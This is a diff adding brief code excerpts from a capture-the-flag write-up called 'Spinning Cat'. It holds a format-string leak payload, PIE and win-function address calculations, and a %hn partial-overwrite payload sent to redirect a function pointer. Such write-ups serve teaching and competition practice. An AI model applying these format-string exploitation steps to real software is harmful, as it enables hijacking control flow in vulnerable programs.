@@ -1,0 +1,12 @@
+# Spinning Cat
+# Code and command excerpts from the UMCS UM 2026 write-up.
+
+## Derive PIE and function-pointer addresses (text)
+%7$p.%42$p
+pie = leaked_sing_oiia - 0x12ee
+win = pie + 0x1251
+fp_slot = leak42 - 0x138
+
+## Partially overwrite song with %hn (python)
+payload = build_hn_payload(fp_slot, win & 0xffff, argpos=16)
+io.send(payload)
